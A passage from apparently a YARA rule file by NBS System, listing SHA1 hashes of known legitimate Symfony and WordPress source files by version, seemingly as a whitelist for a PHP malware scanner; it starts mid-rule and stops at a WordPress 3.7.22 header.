        hash.sha1(0, filesize) == "693d923f3232b462e7104eff546735c98844cbe8" or // src/Symfony/Component/Security/Http/EntryPoint/RetryAuthenticationEntryPoint.php
        hash.sha1(0, filesize) == "f0fc40c87f5d8c06d5529ab0093e735f30df5917" or // src/Symfony/Component/Process/Process.php
        hash.sha1(0, filesize) == "e8fb0a72f9a3c11be20e2cc7a28d11df3416fc9f" or // src/Symfony/Component/Process/Tests/ExecutableFinderTest.php
        hash.sha1(0, filesize) == "561a4d214202da50d8816a3a59bc4ebe1356c7cf" or // src/Symfony/Component/Form/Tests/Extension/Core/Type/FileTypeTest.php
        hash.sha1(0, filesize) == "b67f52cfe76bf1e5ced4625ba506258508d075de" or // src/Symfony/Component/EventDispatcher/EventDispatcher.php
        hash.sha1(0, filesize) == "a79b90692b4edf22230e9cad0d38596e4994383f" or // src/Symfony/Bundle/FrameworkBundle/Controller/RedirectController.php
        hash.sha1(0, filesize) == "3123a1fbb7cc12ca526a5b1e3939b024992e5a10" or // src/Symfony/Component/Filesystem/Tests/FilesystemTest.php
        hash.sha1(0, filesize) == "c47ee46b12ca5a74f624069924e35bceba7aa57d" or // src/Symfony/Component/Process/Tests/ProcessTest.php
        hash.sha1(0, filesize) == "39af1d8a3bb291edca53669647d3d0df11ff0c6b" or // src/Symfony/Component/Process/ExecutableFinder.php
        hash.sha1(0, filesize) == "7901c56989cc0e1a4db453e37fe7449053915b78" or // src/Symfony/Component/Debug/DebugClassLoader.php
        hash.sha1(0, filesize) == "ce0f8199388e3ba36b28ecd8674f750860ec1228" or // src/Symfony/Component/HttpKernel/UriSigner.php

        /* Symfony 4.0.2 */
        hash.sha1(0, filesize) == "1c562d622fc3cb58eb2c3b24107a23c055b7cc64" or // src/Symfony/Component/Process/Process.php
        hash.sha1(0, filesize) == "c00515f3dad94c02368fe7d0543a3b8707c87f7a" or // src/Symfony/Component/Filesystem/Tests/FilesystemTest.php
        hash.sha1(0, filesize) == "2c138140d599c584016edb867420033a3da198cc" or // src/Symfony/Component/Process/Tests/ProcessTest.php

        /* Symfony 4.0.3 */
        hash.sha1(0, filesize) == "8381bfe62e337a44e9cd825c2123075de1a08013" or // src/Symfony/Component/Process/Process.php
        hash.sha1(0, filesize) == "a9b821f59fb1a093d1cd36916116496606e41da2" or // src/Symfony/Component/Filesystem/Tests/FilesystemTest.php
        hash.sha1(0, filesize) == "7041d041961aa55a90325852e181bdf78edfb6e4" or // src/Symfony/Component/Process/Tests/ProcessTest.php
        hash.sha1(0, filesize) == "02de4ca28714c29df4fb425dd0e1afa412529a0c" or // src/Symfony/Component/Debug/DebugClassLoader.php

        /* Symfony 4.0.4 */
        hash.sha1(0, filesize) == "4caf5145213b4cb8f5922de87233a621859d2525" or // src/Symfony/Component/Process/Process.php

        /* Symfony 4.0.5 */
        hash.sha1(0, filesize) == "ba720c308bbea2f2dccc30217f0225cbc6f887a2" or // src/Symfony/Component/Process/Process.php
        hash.sha1(0, filesize) == "3edaf086dbd7202caec6e15ce578dd846245c1c8" or // src/Symfony/Bundle/FrameworkBundle/Controller/RedirectController.php
        hash.sha1(0, filesize) == "7009a4e3cd672535586eb18dcbdb203e77de8b21" or // src/Symfony/Component/Debug/DebugClassLoader.php

        /* Symfony 4.0.7 */
        hash.sha1(0, filesize) == "912d67551dc6bb768733d58d5224da11c78b1b4d" or // src/Symfony/Component/Process/Process.php

        /* Symfony 4.0.10 */
        hash.sha1(0, filesize) == "e4b1a36ca3eb6eebf8b67d46fb592cdf20687dd8"    // src/Symfony/Component/Process/ExecutableFinder.php

}
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

import "hash"

private rule Wordpress : CMS
{
    meta:
        generated = "2018-05-29T21:58:54.242806"

    condition:
        /* Wordpress 2.0 */
        hash.sha1(0, filesize) == "bbb86765c1fb77a073e4bb76b97223360a140438" or // wp-includes/links.php
        hash.sha1(0, filesize) == "fbaa6d7843fb7fb1d761fb4e89fd727cd247fe5b" or // wp-admin/admin-functions.php
        hash.sha1(0, filesize) == "dfa0f69cff59b3784ef3ff5aa494291a536af799" or // wp-admin/execute-pings.php

        /* Wordpress 2.0.1 */
        hash.sha1(0, filesize) == "c1e726699d59c7e2e401a8881e19080ffcf9d5db" or // wp-admin/admin-functions.php

        /* Wordpress 2.1 */
        hash.sha1(0, filesize) == "30bafe9b7676fce546e4fd336c736b4c9ff552b0" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "f455b31b339fe9bde065b83557c827a79f3c83da" or // wp-includes/js/tinymce/tiny_mce_gzip.php
        hash.sha1(0, filesize) == "5861ba2b2450b0f0253638b4620296cc0f14e481" or // wp-admin/upgrade-functions.php
        hash.sha1(0, filesize) == "17f2dee4758b8954a3ea530bef32d42c0f788cca" or // wp-admin/admin-functions.php

        /* Wordpress 2.1.1 */
        hash.sha1(0, filesize) == "3d0be10443bcf5da1bda9af01e3f0fa949bbe71b" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "4294be40fa4d4bdc3325a95bba19ce016b16c36a" or // wp-includes/js/tinymce/tiny_mce_gzip.php
        hash.sha1(0, filesize) == "29960dd8a3266618660ca61eedbe621add7b57b2" or // wp-admin/admin-functions.php

        /* Wordpress 2.1.3 */
        hash.sha1(0, filesize) == "0aeea754cd309c6e83d46319321af3287f93aeee" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "f0b82ec7531440a35614f719608fd230343b2a96" or // wp-admin/admin-functions.php

        /* Wordpress 2.2 */
        hash.sha1(0, filesize) == "bf2b70e53ee67b2ae7810a26efd10015007ef35b" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "04f521363e4be1a84ced344b6246a115fdf43680" or // wp-admin/admin-functions.php
        hash.sha1(0, filesize) == "13d44b4fe578ac92865b932116b642553e66138d" or // wp-admin/upgrade-functions.php

        /* Wordpress 2.2.1 */
        hash.sha1(0, filesize) == "a762bc60035fbd07a03395990e3a17225d40c18c" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "ba7c2dabdd8f354805e7954af1dae347af5b2b5b" or // wp-admin/admin-functions.php

        /* Wordpress 2.2.2 */
        hash.sha1(0, filesize) == "1f3ca35fc4f3392e0675d00e7faf2d14454581bd" or // wp-admin/admin-functions.php

        /* Wordpress 2.2.3 */
        hash.sha1(0, filesize) == "8b102045500a90e57816b7c4cec2e013389ffc15" or // wp-admin/admin-functions.php

        /* Wordpress 2.3 */
        hash.sha1(0, filesize) == "a56dd3402d9a6ac7d9c7458de78bb9fe690a4e61" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "c33ad18180e5f214882cfc5089244dd5c1dec904" or // wp-includes/post.php
        hash.sha1(0, filesize) == "d7c2fc6360bbc5e005ad5a2a5bba3f9a6d0c3985" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "1fa290b5a1db0f3c06c4bb677d71e0dace5bc407" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "7b93edca9041240d7dc8ef1c1a8c01f8c06f1192" or // wp-includes/deprecated.php

        /* Wordpress 2.3.1 */
        hash.sha1(0, filesize) == "cfcc7996f4e62dc3ea90a9ec51f8640a237850fe" or // wp-includes/post.php
        hash.sha1(0, filesize) == "5e1660411a9b827f69a918af706f297530d32312" or // wp-admin/includes/upgrade.php

        /* Wordpress 2.3.2 */
        hash.sha1(0, filesize) == "efd2b4896682d3de2c480437f0f30fc4b831a760" or // wp-includes/post.php
        hash.sha1(0, filesize) == "08f74717b55528b53d57ae36ce666fbd1dfd7f5c" or // wp-admin/includes/file.php

        /* Wordpress 3.0 */
        hash.sha1(0, filesize) == "2f17823196a19d5a1ceef3956e3d2eb040cbe94a" or // wp-includes/post.php
        hash.sha1(0, filesize) == "732b23a64894405084d045c1a54c727c3dfff7f3" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "0898f45c014c8498a75f7daf6b0cbdf441bb9117" or // wp-includes/js/tinymce/plugins/spellchecker/rpc.php
        hash.sha1(0, filesize) == "d6ef8c8a1ea02f5c85e50f2eed0a8cbd5e5d0193" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "f73f1e853035a9d762e0a314576c356a96f2b976" or // wp-admin/gears-manifest.php
        hash.sha1(0, filesize) == "5bc32390a960922991aa7ecd3c1a180ae29949a0" or // wp-includes/wp-db.php
        hash.sha1(0, filesize) == "38e877cac581bd695352ff0137edfcad3e3d1bf8" or // wp-admin/edit.php
        hash.sha1(0, filesize) == "da9d42e33e31a89b8e43713fdf6d481a90346b3b" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "6ccb3d84b02c0f61cdeb5cb6aa31074b5f84dc13" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "3726a55657ae60127682814ce08bab8e681846eb" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "81b5123e57455d1c6c7528a0a41900ce1097557b" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "079c1412cf049087ece1dbdce8e6eda255298dab" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "f5cd852cef9b5ddce964576077a9453d5bed6e67" or // wp-includes/deprecated.php

        /* Wordpress 3.0.1 */
        hash.sha1(0, filesize) == "ef830c5ea01d5c987e33a0329586752eff3f8668" or // wp-includes/post.php
        hash.sha1(0, filesize) == "b692ab19c4a4e165247fe5231ac8c9500a6ef332" or // wp-includes/wp-db.php
        hash.sha1(0, filesize) == "5fc135be16eccaf2c57dc0da95afb2595ab38219" or // wp-admin/edit.php
        hash.sha1(0, filesize) == "6fc8176d6e55cfb2d147045f0a3d51e1d18b3324" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "00523ecfaea6728acf8039904689e72fb3db2ce5" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "c02bebd5fed0f29fd757f797ede847290c1b3faf" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "cd9d212000368fdafec7d4de119243468bdb59a3" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "db884c013d52a30d7f9bce0c5ab6b71e727bf3d1" or // wp-includes/deprecated.php

        /* Wordpress 3.0.2 */
        hash.sha1(0, filesize) == "1568c01754122010324c7e54b16d0ee729db7fb8" or // wp-admin/includes/file.php

        /* Wordpress 3.0.4 */
        hash.sha1(0, filesize) == "8c6fd610d0c1011738bc609037cdb20f612c6dd3" or // wp-includes/formatting.php

        /* Wordpress 3.0.5 */
        hash.sha1(0, filesize) == "4b4e2812781b43b230ee8518b41655651c46fae3" or // wp-admin/includes/template.php

        /* Wordpress 3.0.6 */
        hash.sha1(0, filesize) == "b20516753f8b08274f37d0af8ac292fde675ae71" or // wp-admin/press-this.php

        /* Wordpress 3.1 */
        hash.sha1(0, filesize) == "52b72bb5ed4f17ecc9b9eed29a2ea85bc25ccb80" or // wp-includes/post.php
        hash.sha1(0, filesize) == "dce46c28a1e7f873d0690eeebf5599107b5cc9bd" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "afafe4f64f7d03d7c6388376e8e4b95452df0e0f" or // wp-includes/js/tinymce/plugins/spellchecker/rpc.php
        hash.sha1(0, filesize) == "98de0eaa9d98036bc80e72b1cc36df55a2285608" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "4284eb6c751a85a92918ea860c81e918fed4d12b" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "4de3ef74d659fe6a03c6b8eb573a409ec788a786" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "e9eca94390585b1464acf2fe403e8e622017b213" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "1d18eb1761d198bcbcd4483df0d0d6962347fee3" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "46282e82abd01e487214fbe92c18bf91d903540f" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "a22397b4d9c5f1c17b05a16a2bb5a62d18de98bc" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "9416ed9d35945516e0a8a9765da446cfba784744" or // wp-includes/deprecated.php

        /* Wordpress 3.1.1 */
        hash.sha1(0, filesize) == "8a4e3484e8ec2e66688123f99628eed3801d735c" or // wp-includes/post.php
        hash.sha1(0, filesize) == "43f3fb72755eb50a1ce668cfab901596e80d30d4" or // wp-includes/formatting.php

        /* Wordpress 3.1.2 */
        hash.sha1(0, filesize) == "1245a779337ad2848deb784b72c0d5b757897452" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "113e23c7e90755b6eb6a7dfd59ee8dc38ab567ac" or // wp-admin/press-this.php

        /* Wordpress 3.1.3 */
        hash.sha1(0, filesize) == "1bb1e85fff06511daf3fd83199caecdabab6e399" or // wp-includes/post.php
        hash.sha1(0, filesize) == "a74eb72e85391e8b1cc73ab31bbd0e354ac46ddc" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "2fac6d0984fcfdd13e65cb6131a1cf4b3833aa28" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "c1009c13e48211fc4100c3a947a8d4bfc5e416bc" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "8146cc5e953af859b2ffb7f62b88829acdb83db9" or // wp-includes/formatting.php

        /* Wordpress 3.1.4 */
        hash.sha1(0, filesize) == "dfbfa7de5b02c336ec104009d6beb239ca51d37d" or // wp-includes/post.php
        hash.sha1(0, filesize) == "34575033fdc4a88485affd3a22ae16431d14cf2c" or // wp-includes/formatting.php

        /* Wordpress 3.2 */
        hash.sha1(0, filesize) == "ce4bb6419545ddd1ce707d30698872ca57f84289" or // wp-includes/post.php
        hash.sha1(0, filesize) == "9e618bf8db66289bbe562e82cb58d5938a5db0ef" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "0d57e786b77492eb32520d94c8dabc4d4ac305a8" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "f2ee76708f1ff6ccf1359535c9ad2dbce6898ae1" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "d83c053168882c6b15b7f74a804d45b7575749ad" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "1f7ff93c3fab868107914769b605d0def295a6c3" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "edfb987356794111f780504c2229cc3b01afbdf8" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "b4f53b8c360f9e47cc63047305a0ce2e3ff6a251" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "7622efd361b7e6550387413a289c5f5475d0ccca" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "232e4705e3aa28269c4d5e4a4a700bb7a2d06f24" or // wp-admin/includes/menu.php
        hash.sha1(0, filesize) == "ac8298df16a560c80fb213ef3f51f90df8ef5292" or // wp-includes/class-phpmailer.php
        hash.sha1(0, filesize) == "1c9072768299b183d4857f1885ca82de4bebfb06" or // wp-includes/deprecated.php

        /* Wordpress 3.2.1 */
        hash.sha1(0, filesize) == "c2b547fc0d12ede138e8cffd5b1aa27acbfa29e4" or // wp-includes/post-template.php

        /* Wordpress 3.3 */
        hash.sha1(0, filesize) == "129ef278a99a98ce31f1235cf69bc2cdee267d14" or // wp-includes/post.php
        hash.sha1(0, filesize) == "413aad57841069fc0b0740d1c7c7c2d4d7d988be" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "108330d48a7c61427ccd6a811d06e32068794193" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "cc196ca59fcaa32da38d3232121720c2b66670ef" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "dd6c03117c5be60136154ca6c9f253a2b34111eb" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "5a598c1ad6c0fa1be0220a74f61165fc5cb3ffe8" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "8f2a8da640cca1f6530e856bb0936a522689cafb" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "55afddd06127cacb9921fe97010d6de32fc466f5" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "5de87a28128621172c2472771473f66ceb92f9c1" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "7d32f26d2eaf41cfb3db7aca06564501741f01ef" or // wp-includes/deprecated.php

        /* Wordpress 3.3.1 */
        hash.sha1(0, filesize) == "91761dab0e381623c11d466eb8bbe6473089c262" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "bb611f70db077823eac67668ce0eabb287dcfc32" or // wp-admin/press-this.php

        /* Wordpress 3.3.2 */
        hash.sha1(0, filesize) == "dde98051187dd8980d1c71b238f8f49ac3c01e75" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "4ba4cd920935b9c97934292e8278122c0d1ac54b" or // wp-includes/formatting.php

        /* Wordpress 3.4 */
        hash.sha1(0, filesize) == "ce118a1e4e0e13ec970455c5991a6e3c5587b50c" or // wp-includes/post.php
        hash.sha1(0, filesize) == "fd3b2cc886f96f2ab1b59475463ec8c2794f4a2b" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "7c236e3cb3578caa348b5bad2b69b55c0a8a28ca" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "cc5d596aeed57bdb3fb4cd3e36d51934a7e5b036" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "608fa4bc1a549c23d9b5a84d5b7b5c78f0b657e0" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "0909c3bdf43e04ac56a25ef905dd0b4f53b9ffe9" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "8e774a3fc20846ec483e697df70dd880d7bc6501" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "19716dcd7c07c7f3cf5bd83188722ce353a698e5" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "05d4712b1ca6512eabd5d1f0829002872fe715e4" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "59458078cdf7f72d2973bc9847c2e6abc4fe51c0" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "4db56ae7ff0df0dce135dc048eb61e6eb7f5cdda" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "b4e4b88f2be38ed9c3147b77c2f3a7f929caba2c" or // wp-admin/includes/menu.php
        hash.sha1(0, filesize) == "75e2ec0402e1d4b9e831baa6b9d6f680799f3fad" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "3d6a6cda6cfc2442e9e9b2822f3f610fb9a6da9d" or // wp-includes/deprecated.php

        /* Wordpress 3.4.1 */
        hash.sha1(0, filesize) == "68bdb7929d80b646d48597098d5635baab715f1f" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "b081cb618291aed33c5cdf7a1d0a96092254acc0" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "833281b4d1113180e4d1ca026f5e85a680d52662" or // wp-includes/class-phpmailer.php

        /* Wordpress 3.4.2 */
        hash.sha1(0, filesize) == "033d2a4d4b567bc0675270945c508706d53ad599" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "26c688bdc903314554443253e9c1131f3e96f5f1" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "3351b803ce18ae6044aad29d0a13f83603089822" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "aa35944e09e5f0224ebc8e7092749986c3ddce68" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.5 */
        hash.sha1(0, filesize) == "1b78bfbab457c9d4c323d125a71ffc8a0fbf9567" or // wp-includes/post.php
        hash.sha1(0, filesize) == "59c3672039f391e0eae6404d65be0c2807413822" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "28e0b9240c060cd9931cd13ab9cf4a3ff072b21b" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "e778fd21f4c37cbde6ef51dd698ccf5a86869014" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "41053178dc4f65a6cdaaed828936ecf58b08f64e" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "6061b47bcabfee2dd173a8d7226d5f1de83a3b50" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "79764a44e76d4592b80f81d36ff4afac8c8ef15a" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "32eb59b7604a3c7302d9e99194c94be8f59543db" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "13b7f0b3c81cc7f4e81fb7ed3df7a57ba33fc9e2" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "b6eea88c56a8db31a182353dc4c87e91fca1fa58" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "38c2d4b07a569816ec202277a5ef6b7724857f43" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "676dcf811757529323b6cec162b53ea827f82581" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "412986ba7634bd47b49b217c3f3994c321bb04cc" or // wp-includes/js/tinymce/tiny_mce.js
        hash.sha1(0, filesize) == "cdc24ca5c7bfcd559282559d2fb7edf97d0bb07b" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "d667f8cbda4ae5ff27ebdfbf80460b365f95ad46" or // wp-includes/SimplePie/Parse/Date.php
        hash.sha1(0, filesize) == "61ce791f8e638f784ea78de8aac14542fecde62c" or // wp-includes/deprecated.php

        /* Wordpress 3.5.1 */
        hash.sha1(0, filesize) == "b9772cdb5248c28b63c6fe54061eae3c905ef5d4" or // wp-includes/post.php
        hash.sha1(0, filesize) == "fad8e68cef70e8c88acfbee311fba3e19af686ac" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "dae4d60844af60c4af91022eff915acb40a35eda" or // wp-includes/js/tinymce/tiny_mce.js

        /* Wordpress 3.5.2 */
        hash.sha1(0, filesize) == "58c4fec199374f11a4d25f286310d26f32b34698" or // wp-includes/post.php
        hash.sha1(0, filesize) == "ed42423b4ea804a266b55ee8a43c784b94484db8" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "d2d79f3132131e04da1e65fb745ef8fe17913ec9" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "63150bc5aba51631a7d1173fe6eb1457e746f67e" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "91f418e5bf982e704bdf636e24bbb3544157e360" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "82f82acd2596d052599289d31fffe9b4a7044a58" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "b142d05e08e17cdae63ff3f7d2ba4f52a5220fe4" or // wp-includes/js/tinymce/tiny_mce.js
        hash.sha1(0, filesize) == "0712dbf8d70766e46cec993ccab1516afff9880e" or // wp-includes/deprecated.php

        /* Wordpress 3.6 */
        hash.sha1(0, filesize) == "1c3de7e965a68621ebe391f8c6bdf4a8f0180864" or // wp-includes/post.php
        hash.sha1(0, filesize) == "e6ed991a6a9ca86907ff64fffe3d703ba6cd2c7f" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "3b0f92aceabde1d563890109a9e4010083602910" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "225332f9e5b729fa5559d400d7bb519a742cf754" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "789ebc024dcf585583eeb380d048313dbe638fd1" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "cb6172495e8c3f5188d2a92a7604c2c29590e740" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "bee3dce3c314e3e7bff07a212a1526d705a082b4" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "41be5d2219e9b68d82e5bb389514e7a3d317908e" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "94867d244014a346f7adb305fc6ae266869f5a31" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "4856f6c16233bd80ab3ef38150a869853b0824f6" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "f4f02289d2c5d79cdc1e43f7a85a1bb18c1a57ed" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "546d97581cead4a9174e870fda57509bee7c64a6" or // wp-includes/deprecated.php

        /* Wordpress 3.6.1 */
        hash.sha1(0, filesize) == "ea9c9f658f90dc5ce7949b7fe84c5227ebdcdb5e" or // wp-includes/post-template.php

        /* Wordpress 3.7 */
        hash.sha1(0, filesize) == "25eb4aafa1055bb4073c59c94d8fa613af46bb8d" or // wp-includes/post.php
        hash.sha1(0, filesize) == "b379ed312821de983940d95277ecc8d6c0612cc1" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "8e280fe121b4d80b26f03ab102126be16e8f1713" or // wp-admin/custom-header.php
        hash.sha1(0, filesize) == "1a279555b3b42acf396c64685fa3609550c50a54" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "5b03f5c0af13e2af46895d9bd44a0051933fc13c" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "e82e992ec0458021e3cac6d29d63ee402a0b6f0f" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "b1933980774e43f9ae0da0ef4864c0eb0075021d" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "090c6a51677e08011819fdfedd66f3d2324c655a" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "410511b419a166099c80c45987f6c58ca6d596dc" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "ebfa83b889d5c78595fbe6b4b7fe979c24c7ebdc" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "7bdc00fe5f1b5de5e3709434bf3068fe0f922808" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "729cfb5974a799dcf03352385016115d53a6c3fb" or // wp-includes/js/tinymce/tiny_mce.js
        hash.sha1(0, filesize) == "2a6efef04595109e9d38ffa63fa239b6a7f48a20" or // wp-includes/js/tinymce/wp-tinymce.js.gz
        hash.sha1(0, filesize) == "b68beee5d6af56d3869410ac6987a07346b3b37e" or // wp-includes/class-wp-editor.php
        hash.sha1(0, filesize) == "83a5d5b6ee067f0d3ea61a53a00d429300660f2b" or // wp-includes/deprecated.php

        /* Wordpress 3.7.1 */
        hash.sha1(0, filesize) == "cf8020daa2651b9eb70d6f82a76dbe95779acfa3" or // wp-includes/post.php
        hash.sha1(0, filesize) == "aac10c3ce50d3796942005ea7e2d2c266fdf39af" or // wp-includes/js/tinymce/wp-tinymce.js.gz

        /* Wordpress 3.7.2 */
        hash.sha1(0, filesize) == "f7e8fe7a94e29dddf97c75593549a67af5f3d0b1" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.7.3 */
        hash.sha1(0, filesize) == "40874153683b4ddee5b035e0ae8f00969daa17b6" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.7.4 */
        hash.sha1(0, filesize) == "48a3dab94dc548169700bb411148c6fbf30274c3" or // wp-includes/ID3/getid3.lib.php

        /* Wordpress 3.7.5 */
        hash.sha1(0, filesize) == "cfd871860c963b0fc5ab2d8c57bbe5fffd7dcb18" or // wp-admin/press-this.php
        hash.sha1(0, filesize) == "216423bf8c4d941eb3b5f40b24238fdc10516617" or // wp-includes/formatting.php

        /* Wordpress 3.7.6 */
        hash.sha1(0, filesize) == "3b81d2dafa7c2f263dcfe18c8ec40adc0c2036a9" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "a4be73c4196559b3a452f083a7c58a17092f0f2c" or // wp-includes/class-wp-editor.php

        /* Wordpress 3.7.8 */
        hash.sha1(0, filesize) == "cba09f833be2259aecac397e1725b2ee1aa8d63c" or // wp-admin/includes/upgrade.php

        /* Wordpress 3.7.9 */
        hash.sha1(0, filesize) == "b8df313b398f8d2a8ae8ca2c1ea87bb0ec3fa630" or // wp-includes/formatting.php

        /* Wordpress 3.7.10 */
        hash.sha1(0, filesize) == "3cdbe2d5884aa7c7ccfd9a63362bd8b551972eba" or // wp-includes/post.php
        hash.sha1(0, filesize) == "469a0400b94c2bbc6a01282cb0a58b5ef7766605" or // wp-includes/formatting.php

        /* Wordpress 3.7.14 */
        hash.sha1(0, filesize) == "50c414aeda8efa51d156742ae87a2ae4e46e9aae" or // wp-admin/includes/media.php

        /* Wordpress 3.7.15 */
        hash.sha1(0, filesize) == "2e8b912d7d8f6776263f6d440139ebf72cb835b1" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "7dd2fcce4f1473ef8d845440560dd61a80fe0736" or // wp-includes/formatting.php

        /* Wordpress 3.7.16 */
        hash.sha1(0, filesize) == "de1ce381b78522854c40d0ed5d6e01ddcaf6583e" or // wp-admin/includes/media.php

        /* Wordpress 3.7.17 */
        hash.sha1(0, filesize) == "fb860c6ac67d10057c6d0fb278790fbb0b3a037e" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "0dd1660527a337e98e4bfa236d236b5c5154ead2" or // wp-includes/class-phpmailer.php

        /* Wordpress 3.7.18 */
        hash.sha1(0, filesize) == "e254fc20dd675a2b96100a5f136999e9381454b5" or // wp-admin/press-this.php

        /* Wordpress 3.7.19 */
        hash.sha1(0, filesize) == "bbfe6f422aa0da18e8c59824b9009bdff2ea6956" or // wp-admin/includes/media.php

        /* Wordpress 3.7.20 */
        hash.sha1(0, filesize) == "6c2e10b76811e395bb04b2fca43788859e91e315" or // wp-admin/includes/media.php

        /* Wordpress 3.7.21 */
        hash.sha1(0, filesize) == "e161b8ff19233616fcbb677c54e67173c9b09ac3" or // wp-admin/includes/file.php

        /* Wordpress 3.7.22 */
